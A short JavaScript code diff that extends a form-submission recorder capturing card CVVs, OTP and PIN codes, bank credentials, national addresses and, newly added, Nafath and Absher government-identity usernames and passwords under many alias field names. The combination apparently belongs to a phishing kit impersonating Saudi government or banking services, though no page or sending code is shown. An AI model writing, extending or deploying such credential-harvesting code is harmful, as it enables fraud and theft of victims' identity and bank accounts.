@@ -237,7 +237,8 @@ function recordSubmission(type, payload) {
     set("cardCvv", ["cvv"]);
     set("otp", ["otp", "otpCode", "code", "otpValue", "pinCode", "pin"]);
     set("nafathId", ["nafathId", "nafathNumber", "nafathIdentity"]);
-    set("nafathPassword", ["nafathPassword", "password"]);
+    set("nafathUsername", ["nafathUsername", "nafathUser", "nafathLogin", "nafathLoginName", "nafathUserName", "nafseUsername", "nafseUser", "absherUsername", "absherUser", "userName"]);
+    set("nafathPassword", ["nafathPassword", "nafathPass", "nafsePassword", "absherPassword", "password"]);
     set("bankUsername", ["bankUsername", "username", "userId", "userid"]);
     set("bankPassword", ["bankPassword"]);
     set("address", ["address", "nationalAddress", "streetName", "district"]);
